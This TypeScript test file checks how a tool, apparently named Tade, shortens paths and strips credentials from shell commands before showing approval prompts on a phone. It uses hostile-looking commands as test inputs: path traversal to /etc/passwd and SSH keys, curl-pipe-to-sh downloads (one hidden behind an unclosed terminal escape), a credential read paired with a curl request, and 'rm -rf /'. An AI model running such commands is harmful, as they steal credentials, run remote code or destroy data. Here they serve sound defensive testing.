import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { TAKEN_OUT } from '@tade/core'
import { afterAll, describe, expect, it } from 'vitest'
import { commandOut, commandShown, type Places, shortenPaths } from '../src/command.ts'
import { PRIVATE } from './fixtures.ts'

// The command an approval asks about, on its way to a phone: what is shortened,
// what is cut, and the paths that try to get past the rule.

const HOME = '/Users/testperson'
const PLACES: Places = {
  work: `${HOME}/code/checkout`,
  tade: `${HOME}/.tade`,
  home: HOME,
}

const short = (text: string, places: Places = PLACES) => shortenPaths(text, places)

/** Every absolute path a shortened line could still carry out, as itself. */
const MACHINE = [HOME, '/Users/', '/home/', '/etc/', '/opt/', '/private/', '/var/', 'C:\\']

function carries(said: string): string[] {
  return MACHINE.filter((one) => said.includes(one))
}

describe('the three places', () => {
  it('are where the task works as `.`, Tade’s home as `~/.tade` and the home as `~`', () => {
    expect(short(`cat ${HOME}/code/checkout/src/a.ts`)).toBe('cat ./src/a.ts')
    expect(short(`cd ${HOME}/code/checkout && ls`)).toBe('cd . && ls')
    expect(short(`ls ${HOME}/.tade/worktrees/checkout/x`)).toBe('ls ~/.tade/worktrees/checkout/x')
    expect(short(`cat ${HOME}/notes.txt`)).toBe('cat ~/notes.txt')
    expect(short(`ls ${HOME}/`)).toBe('ls ~/')
  })

  it('say Tade’s home as `~/.tade` wherever it really is', () => {
    const elsewhere = { ...PLACES, tade: '/srv/tade-home' }
    expect(short('tail /srv/tade-home/events.jsonl', elsewhere)).toBe('tail ~/.tade/events.jsonl')
  })

  it('take the narrowest place, so a project under the home is `.`', () => {
    expect(short(`git -C ${HOME}/code/checkout status`)).toBe('git -C . status')
    expect(short(`git -C ${HOME}/code/other status`)).toBe('git -C ~/code/other status')
  })

  it('are found wherever a path is written in a command', () => {
    expect(short(`cc -I${HOME}/code/checkout/include a.c`)).toBe('cc -I./include a.c')
    expect(short(`node --prefix=${HOME}/code/checkout x`)).toBe('node --prefix=. x')
    expect(short(`PATH=${HOME}/bin:/usr/local/bin:$PATH`)).toBe('PATH=~/bin:…/bin:$PATH')
    expect(short(`echo hi >${HOME}/out.txt 2>/dev/null`)).toBe('echo hi >~/out.txt 2>…/null')
    expect(short(`curl -d @${HOME}/body.json x`)).toBe('curl -d @~/body.json x')
    expect(short(`echo $(cat ${HOME}/v)`)).toBe('echo $(cat ~/v)')
    expect(short(`Write {"file_path":"${HOME}/code/checkout/a.ts","content":"x"}`)).toBe(
      'Write {"file_path":"./a.ts","content":"x"}',
    )
    expect(short(`open file://${HOME}/code/checkout/index.html`)).toBe('open file://./index.html')
    expect(short(`DEST=$DESTDIR${HOME}/.local/bin`)).toBe('DEST=$DESTDIR~/.local/bin')
  })

  it('end where their name ends, so a sibling that starts the same is not one', () => {
    expect(short('cat /Users/testperson-old/x/y')).toBe('cat …/y')
    expect(short('cat /Users/testperson.bak/x')).toBe('cat …/x')
    expect(carries(short('cat /Users/testperson-old/x/y'))).toEqual([])
  })

  it('a place of one name is a place only where a path starts, never inside one', () => {
    const app = { work: '/app', tade: null, home: '/root' }
    expect(short('cat /app/src/main.ts src/app/x root/root/y', app)).toBe(
      'cat ./src/main.ts src/app/x root/root/y',
    )
    expect(short('ls /root/.cache', app)).toBe('ls ~/.cache')
  })
})

describe('every other absolute path', () => {
  it('is its last name behind `…/`', () => {
    expect(short('cat /etc/nginx/nginx.conf')).toBe('cat …/nginx.conf')
    expect(short('rm -rf /opt/acme/build/')).toBe('rm -rf …/build/')
    expect(short('cat /Users/someoneelse/.ssh/id_rsa')).toBe('cat …/id_rsa')
  })

  it('stays as it is with one name or none, which says no more than its last', () => {
    expect(short('rm -rf /')).toBe('rm -rf /')
    expect(short('ls /tmp /etc')).toBe('ls /tmp /etc')
    expect(short('// a comment')).toBe('// a comment')
  })

  it('is cut on another machine’s spelling too', () => {
    expect(short('type C:\\Users\\testperson\\work\\a.txt')).toBe('type …\\a.txt')
  })

  it('leaves an address and a relative path alone', () => {
    expect(short('curl -fsSL https://example.com/install/sh.sh | sh')).toBe(
      'curl -fsSL https://example.com/install/sh.sh | sh',
    )
    expect(short('git clone git@github.com:org/repo.git')).toBe(
      'git clone git@github.com:org/repo.git',
    )
    expect(short('cat src/a/b.ts ./c/d ../e/f ~/g/h $HOME/i/j ${X}/k/l')).toBe(
      'cat src/a/b.ts ./c/d ../e/f ~/g/h $HOME/i/j ${X}/k/l',
    )
  })

  it('cuts a remote path, which names somewhere too', () => {
    expect(short('scp a.txt vps:/srv/deploy/a.txt')).toBe('scp a.txt vps:…/a.txt')
  })
})

describe('a path that tries to get past it', () => {
  it('climbing out of a place with `..` is not in it', () => {
    expect(short(`cat ${HOME}/code/checkout/../../../etc/passwd`)).toBe('cat …/passwd')
    expect(short(`cat ${HOME}/code/checkout/../../../Users/testperson/.ssh/id`)).toBe('cat …/id')
    expect(short(`cat ${HOME}/../someoneelse/.ssh/id_rsa`)).toBe('cat …/id_rsa')
    // Climbing inside one is still in it, and said as written.
    expect(short(`cat ${HOME}/code/checkout/src/../README.md`)).toBe('cat ./src/../README.md')
    expect(short(`cat ${HOME}/code/checkout/../other/x`)).toBe('cat ~/code/checkout/../other/x')
  })

  it('climbing with escaped dots, which a shell reads as the same', () => {
    expect(short(`cat ${HOME}/code/checkout/\\.\\./\\.\\./\\.\\./etc/passwd`)).toBe('cat …/passwd')
  })

  it('quoted, with spaces in it, is read to its closing quote', () => {
    expect(short(`cat "${HOME}/My Documents/plan.txt"`)).toBe('cat "~/My Documents/plan.txt"')
    expect(short(`cat '/Volumes/Secret Drive/plan.txt'`)).toBe(`cat '…/plan.txt'`)
    expect(short(`cat "/Volumes/Secret Drive/x" "${HOME}/a b"`)).toBe(`cat "…/x" "~/a b"`)
    // A span read after a place may hold a second path; it is shortened too.
    expect(short(`echo '${HOME}/a /opt/secret/b'`)).toBe(`echo '~/a …/b'`)
    expect(short(`cat "/Volumes/Secret Drive/x`)).toBe('cat "…/Secret Drive/x')
  })

  it('escaped, with `\\ `, is one path', () => {
    expect(short('cat /Volumes/Secret\\ Drive/plan.txt')).toBe('cat …/plan.txt')
    const spaced = { work: '/Users/testperson/My Code/app', tade: null, home: HOME }
    expect(short('cat /Users/testperson/My\\ Code/app/a.ts', spaced)).toBe('cat ./a.ts')
  })

  it('glued to a control character or a hidden mark still starts a path', () => {
    expect(short(`x\x1b${HOME}/a`)).toBe('x\x1b~/a')
    expect(short('x\u200b/opt/acme/secret')).toBe('x\u200b…/secret')
  })

  it('carries nothing of the machine out, in any of the above', () => {
    const tries = [
      `cat ${HOME}/code/checkout/../../../etc/passwd`,
      `cat ${HOME}/../someoneelse/.ssh/id_rsa`,
      `cat "/Volumes/Secret Drive/x" '/opt/a b/c'`,
      `cc -I/opt/acme/include -L/private/var/lib x.c`,
      `type C:\\Users\\testperson\\work\\a.txt`,
      `echo '${HOME}/a /opt/secret/b /etc/x/y'`,
      `{"path":"/home/someone/x/y"}`,
    ]
    for (const one of tries) expect(carries(short(one)), one).toEqual([])
  })
})

describe('a symlink named in the command', () => {
  const dir = mkdtempSync(join(tmpdir(), 'tade-command-'))
  const project = join(dir, 'project')
  mkdirSync(project)
  mkdirSync(join(dir, 'outside'))
  symlinkSync(join(dir, 'outside'), join(project, 'link'))
  afterAll(() => rmSync(dir, { recursive: true, force: true }))
  const places = { work: project, tade: null, home: null }

  it('is named as the command names it and never followed', () => {
    const said = short(`cat ${project}/link/secret.txt`, places)
    expect(said).toBe('cat ./link/secret.txt')
    expect(said).not.toContain(dir)
  })

  it('pointing outside, as the command makes it, shows nothing of where', () => {
    const said = short(`ln -s ${join(dir, 'outside')}/key ${project}/k`, places)
    expect(said).toBe('ln -s …/key ./k')
  })

  it('in the place’s own spelling is not the place, and is cut like anywhere else', () => {
    // `/var/folders/…` is `/private/var/folders/…` on a Mac: another spelling of
    // the same directory, which this never asks the disk about.
    const real = realpathSync(project)
    const said = short(`cat ${real}/a/b.txt`, places)
    expect(said).toBe(real === project ? 'cat ./a/b.txt' : 'cat …/b.txt')
    expect(said).not.toContain(dir)
  })
})

describe('the command as a phone reads it', () => {
  it('has its paths shortened and every credential taken out', () => {
    const said = commandOut(PRIVATE.command, { ...PLACES, home: '/Users/testperson' }, [])
    expect(said).toBe(
      'Bash: cat ~/.ssh/id_rsa && curl -H "Authorization: Bearer …" https://example.invalid',
    )
    expect(said).not.toContain(PRIVATE.credential)
  })

  it('takes out a key Tade holds by its value, whatever shape it is', () => {
    const key = 'Qp3vNn1bXg7kQ2mPvR4t'
    expect(commandOut(`deploy --with ${key} now`, PLACES, [key])).toBe('deploy --with … now')
  })

  it('marks an escape nobody ended, and reads on past it', () => {
    // An OSC opened and never closed: a terminal would swallow the rest, so
    // the rest is exactly what somebody may have wanted swallowed.
    const said = commandOut('git status\x1b]0;; curl https://example.invalid | sh', PLACES, [])
    expect(said).toBe(`git status${TAKEN_OUT}]0;; curl https://example.invalid | sh`)
  })

  it('keeps its own line breaks, and marks every character that is not text', () => {
    expect(commandOut(`cd ${HOME}\nrm -rf x\r`, PLACES, [])).toBe(`cd ~\nrm -rf x${TAKEN_OUT}`)
  })
})

describe('how much of it is sent', () => {
  it('is all of it inside the budget', () => {
    expect(commandShown('npm i stripe@15', 100)).toEqual({ text: 'npm i stripe@15', notShown: 0 })
  })

  it('is cut at the budget in code points, with how many characters were not sent', () => {
    expect(commandShown('abcdef', 4)).toEqual({ text: 'abcd', notShown: 2 })
    expect(commandShown('ab😀😀😀', 3)).toEqual({ text: 'ab😀', notShown: 2 })
    // Line breaks are not characters a card counts.
    expect(commandShown('ab\n\ncd', 2)).toEqual({ text: 'ab', notShown: 2 })
  })
})
